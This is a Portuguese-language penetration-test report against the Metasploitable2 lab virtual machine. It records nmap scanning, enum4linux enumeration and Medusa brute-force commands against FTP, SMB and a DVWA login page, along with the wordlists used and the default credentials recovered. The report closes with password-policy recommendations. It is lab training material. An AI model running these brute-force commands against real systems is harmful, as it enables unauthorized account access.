### **Relatório de Análise de Vulnerabilidades e Teste de Invasão**

---

### **1. Resumo**

Este relatório detalha os resultados de um teste de invasão realizado na máquina virtual Metasploitable2, com o objetivo de identificar e explorar vulnerabilidades de segurança. A análise envolveu o escaneamento de portas, enumeração de serviços e a execução de ataques de força bruta contra os serviços FTP, HTTP e SMB. Foram identificadas múltiplas credenciais válidas, permitindo o acesso não autorizado aos sistemas expostos.

---

### **2. Informações do Alvo**

* **Sistema:** Máquina Virtual Metasploitable2
* **Plataforma de Virtualização:** VMware
* **Endereço IP:** 192.168.80.129
* **Endereço MAC:** 00:0C:29:50:53:AC (VMware)

---

### **3. Fase de Reconhecimento e Enumeração**

#### **3.1. Escaneamento de Portas e Serviços**

Foi realizado um escaneamento de portas para identificar os serviços ativos no alvo.

* **Comando Executado:**
    ```bash
    nmap -sV -p 21,22,80,445,139 192.168.80.129
    ```

* **Resultados:**
    * **Porta 21/tcp (FTP):** Aberta, executando `vsftpd 2.3.4`
    * **Porta 22/tcp (SSH):** Aberta, executando `OpenSSH 4.7p1 Debian 8ubuntu1`
    * **Porta 80/tcp (HTTP):** Aberta, executando `Apache httpd 2.2.8 ((Ubuntu) DAV/2)`
    * **Porta 139/tcp (NetBIOS-SSN):** Aberta, executando `Samba smbd 3.X - 4.X`
    * **Porta 445/tcp (NetBIOS-SSN):** Aberta, executando `Samba smbd 3.X - 4.X`

#### **3.2. Enumeração de Serviços**

Para uma análise mais detalhada, foi utilizada a ferramenta `enum4linux`.

* **Comando Executado:**
    ```bash
    enum4linux -a 192.168.80.129 | tee enum4_output.txt
    ```

---

### **4. Fase de Exploração: Ataques de Força Bruta**

Foram criadas listas de palavras (wordlists) personalizadas para realizar os ataques de força bruta.

* **Listas de Palavras Criadas:**
    * `users.txt`: continha os usuários `user`, `msfadmin`, `admin`, `root`
    * `pass.txt`: continha as senhas `123456`, `password`, `qwerty`, `msfadmin`
    * `smb_users.txt`: continha os usuários `user`, `msfadmin`, `service`
    * `senhas_spray.txt`: continha as senhas `password`, `12346`, `Welcome123`, `msfadmin`

#### **4.1. Ataque ao Serviço FTP**

* **Comando Executado:**
    ```bash
    medusa -h 192.168.80.129 -U users.txt -P pass.txt -M ftp -t 6
    ```

* **Credencial Encontrada:**
    * **Usuário:** `msfadmin`
    * **Senha:** `msfadmin`

#### **4.2. Ataque ao Serviço SMB (Samba)**

* **Comando Executado:**
    ```bash
    medusa -h 192.168.80.129 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
    ```

* **Credencial Encontrada:**
    * **Usuário:** `msfadmin`
    * **Senha:** `msfadmin` (com acesso permitido ao recurso `ADMIN$`)

#### **4.3. Ataque ao Serviço HTTP (Página de Login DVWA)**

* **Comando Executado:**
    ```bash
    medusa -h 192.168.80.129 -U users.txt -P pass.txt -M http \
    -m PAGE:'/dvwa/login.php' \
    -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
    -m 'FAIL=Login failed' -t 6
    ```

* **Credenciais Encontradas com Sucesso:**
    * **Usuário:** `msfadmin`, **Senhas:** `123456`, `password`
    * **Usuário:** `admin`, **Senhas:** `123456`, `password`
    * **Usuário:** `user`, **Senhas:** `msfadmin`, `qwerty`, `123456`, `password`
    * **Usuário:** `root`, **Senhas:** `123456`, `password`, `qwerty`

---

### **5. Conclusão**

O teste de invasão obteve sucesso em comprometer múltiplos serviços na máquina alvo através de ataques de força bruta. As senhas fracas e credenciais padrão representam uma vulnerabilidade crítica. Recomenda-se a imediata alteração de todas as senhas identificadas e a implementação de uma política de senhas fortes para mitigar riscos futuros.